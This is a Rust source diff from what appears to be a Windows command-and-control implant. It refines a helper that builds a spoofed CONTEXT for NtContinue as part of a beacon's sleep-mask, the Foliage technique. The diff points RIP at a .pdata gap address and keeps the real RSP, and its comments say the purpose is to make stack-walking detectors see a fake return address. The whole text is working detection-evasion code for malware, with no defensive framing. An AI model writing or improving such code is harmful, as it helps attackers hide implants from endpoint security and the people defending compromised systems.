@@ -77,12 +77,15 @@ impl Context {
         let b = self.buf[off..off + 2].try_into().unwrap();
         u16::from_le_bytes(b)
     }
+    fn write_u16(&mut self, off: usize, v: u16) {
+        self.buf[off..off + 2].copy_from_slice(&v.to_le_bytes());
+    }
 
     // ---- Accessors (offsets from WinNT.h) ----
     pub fn context_flags(&self) -> u32 { self.read_u32(0x30) }
     pub fn set_context_flags(&mut self, v: u32) { self.write_u32(0x30, v) }
     pub fn seg_cs(&self) -> u16 { self.read_u16(0x38) }
-    pub fn set_seg_cs(&mut self, v: u16) { self.write_u32(0x38, v as u32) }
+    pub fn set_seg_cs(&mut self, v: u16) { self.write_u16(0x38, v) }
     pub fn e_flags(&self) -> u32 { self.read_u32(0x44) }
     pub fn set_e_flags(&mut self, v: u32) { self.write_u32(0x44, v) }
     pub fn rsp(&self) -> u64 { self.read_u64(0x98) }
@@ -101,14 +104,16 @@ impl Context {
 
 // ---- CONTEXT control bits (WinNT.h, AMD64) ----
 pub const CONTEXT_AMD64: u32 = 0x0010_0000;
-/// CONTROL | INTEGER | FLOATING_POINT — the minimum NtGetContextThread needs.
-pub const CONTEXT_FULL: u32 = 0x10000B;
-/// Full + SEGMENTS + DEBUG_REGISTERS.
+/// CONTEXT_AMD64 | CONTROL | INTEGER | FLOATING_POINT — matches WinNT.h
+/// `CONTEXT_FULL` (0x100007). CONTEXT_SEGMENTS (0x8) is x86-only and excluded.
+pub const CONTEXT_FULL: u32 = 0x100007;
+/// Full + SEGMENTS + DEBUG_REGISTERS (0x10001F).
 pub const CONTEXT_ALL: u32 = 0x1000_1F;
 
 /// Build a ContextFlags value requesting a full AMD64 context.
+/// `CONTEXT_FULL` already includes `CONTEXT_AMD64` (0x100000).
 pub const fn context_full_flags() -> u32 {
-    CONTEXT_AMD64 | CONTEXT_FULL
+    CONTEXT_FULL
 }
 
 // ---------------------------------------------------------------------------
@@ -123,27 +128,37 @@ const _: () = assert!(core::mem::align_of::<Context>() == 16, "CONTEXT must be 1
 // assert proves the buffer backing those offsets is correct.
 const _: () = assert!(1232 == 0x4D0, "1232 == 0x4D0");
 
+/// Static reusable buffer for the spoofed CONTEXT. Avoids a per-sleep
+/// `Box<[u8; 1232]>` allocation that creates bump-allocator pressure during
+/// the beacon loop. Safe because the beacon loop is single-threaded: the
+/// helper builds the context, queues the APC, then sleeps — by the time the
+/// next cycle overwrites this buffer, `NtContinue` has already consumed it.
+static mut CTX_BUF: Context = Context::default();
+
 /// Build a spoofed CONTEXT for NtContinue: RIP = `target_rip` (a .pdata gap
-/// address), with minimal valid flags so NtContinue accepts it. The CONTEXT is
-/// leaked (Box::into_raw) because it must survive across the APC delivery
-/// boundary (the beacon thread reads it when NtContinue fires).
+/// address), RSP = `real_rsp` (the beacon thread's actual stack pointer),
+/// with `CONTEXT_CONTROL` flags so NtContinue restores both. Returns a
+/// pointer to a static reusable buffer — the previous cycle's buffer is no
+/// longer in use (NtContinue fires before the next call).
 ///
-/// Only RIP + ContextFlags are set — all other registers are zero. This is
-/// intentional: NtContinue with a zeroed CONTEXT + spoofed RIP is the Foliage
-/// technique's "context reset" — the beacon resumes at `target_rip` with a
-/// clean register file (its real state was saved by the helper beforehand or
-/// is irrelevant for the sleep-mask purpose, since the beacon re-enters its
-/// sleep loop after waking).
+/// RIP + RSP + ContextFlags are set — other registers are zero. This is
+/// intentional: NtContinue with a spoofed RIP and real RSP makes stack-walking
+/// detectors see the gap address as the return address, while RSP remains valid
+/// so the thread doesn't crash on the first stack access.
 ///
 /// # Safety
-/// The returned `*mut Context` is leaked (never freed). This is acceptable for
-/// a per-sleep CONTEXT (one per sleep cycle, process lifetime is short). A
-/// production variant would use a static buffer pool.
-pub unsafe fn spoofed_context(target_rip: u64) -> *mut Context {
-    let mut ctx = Context::default();
+/// The returned `*mut Context` points to a static mutable buffer that is
+/// overwritten on each call. This is safe because the single-threaded beacon
+/// loop guarantees NtContinue fires before the next `spoofed_context` call.
+pub unsafe fn spoofed_context(target_rip: u64, real_rsp: u64) -> *mut Context {
+    use core::ptr::addr_of_mut;
+    let ctx = &mut *addr_of_mut!(CTX_BUF);
+    // Zero the buffer so stale fields from a previous cycle don't leak.
+    ctx.buf.fill(0);
     ctx.set_context_flags(CONTEXT_AMD64 | 0x1 /* CONTEXT_CONTROL */);
     ctx.set_rip(target_rip);
-    alloc::boxed::Box::into_raw(alloc::boxed::Box::new(ctx))
+    ctx.set_rsp(real_rsp);
+    ctx as *mut Context
 }
 
 #[cfg(test)]
